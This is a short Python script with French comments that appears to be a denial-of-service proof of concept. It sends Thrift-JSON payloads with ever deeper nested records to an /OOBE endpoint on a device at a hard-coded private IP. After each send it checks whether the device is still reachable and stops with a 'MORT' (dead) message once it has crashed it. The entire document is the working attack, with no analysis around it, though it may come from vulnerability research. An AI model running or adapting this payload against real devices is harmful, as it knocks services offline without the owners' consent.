import urllib.request, socket, time
DEV="10.201.126.241"
def alive():
    try:
        s=socket.create_connection((DEV,8080),timeout=3); s.close(); return True
    except: return False
def post(body, tmo=8):
    try:
        r=urllib.request.Request(f"http://{DEV}:8080/OOBE", data=body,
            headers={"Content-Type":"application/x-thrift"})
        resp=urllib.request.urlopen(r,timeout=tmo)
        return resp.status
    except urllib.error.HTTPError as e:
        return f"HTTP{e.code}"
    except Exception as e:
        return type(e).__name__
print("baseline:", alive())
# structure Thrift-JSON VALIDE avec record imbriques
for depth in [50, 200, 1000, 5000, 20000, 60000]:
    body = b"[1,\"ping\",1,1," + b"{\"0\":{\"rec\":" * depth + b"{}" + b"}}" * depth + b"]"
    t0=time.time()
    st=post(body)
    ok=alive()
    print(f"depth={depth:6} len={len(body):9} -> {st!s:10} alive={ok} ({time.time()-t0:.1f}s)")
    if not ok:
        print(f"  ★★★ MORT a depth={depth}"); break
    time.sleep(1)
